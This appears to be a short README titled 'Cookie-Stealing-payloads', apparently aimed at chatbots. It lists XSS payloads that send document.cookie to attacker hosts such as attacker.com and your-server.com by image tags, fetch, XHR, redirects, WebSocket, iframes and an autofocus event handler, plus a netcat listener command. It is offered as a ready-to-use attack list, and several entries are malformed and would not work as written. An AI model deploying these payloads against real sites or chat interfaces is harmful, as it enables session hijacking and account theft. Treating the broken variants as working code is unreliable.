# Cookie-Stealing-payloads
For chatbot mainly 

document.write('<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />')

<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie;</script>

<script>fetch('https://your-server.com/steal?cookie='+document.cookie)</script>

document.write('cookie: ' + document.cookie)

<script>
  var i = new Image();
  i.src = "http://your-server.com/log?cookie=" + document.cookie;
</script>
 
Set Up a Listener : nc -lvp 8080

1. Basic Cookie Exfiltration

<script>fetch('http://your-server.com/log?cookie=' + document.cookie);</script>

2. Using an Image

<img src="http://your-server.com/log?cookie=" + document.cookie />

3. Redirect via Script

<script>window.location='http://your-server.com/log?cookie=' + document.cookie;</script>

4. Dynamic JavaScript File Inclusion

<script src="http://your-server.com/log.js?cookie=" + document.cookie></script>

5. XHR (XMLHttpRequest)

<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://your-server.com/log?cookie=" + document.cookie, true);
  xhr.send();
</script>

6. Form Submission

<form action="http://your-server.com/log" method="POST">
  <input type="hidden" name="cookie" value="<script>document.cookie</script>" />
  <input type="submit">
</form>

7. Iframe Cookie Stealing

<iframe src="http://your-server.com/log?cookie=" + document.cookie></iframe>

8. WebSocket

<script>
  var ws = new WebSocket("ws://your-server.com");
  ws.onopen = function() {
    ws.send(document.cookie);
  };
</script>

9. CSS URL Injection (Non-Script)

<div style="background-image: url('http://your-server.com/log?cookie=" + document.cookie);"></div>

10. Event-Based Injection

<input onfocus="fetch('http://your-server.com/log?cookie=' + document.cookie)" autofocus>
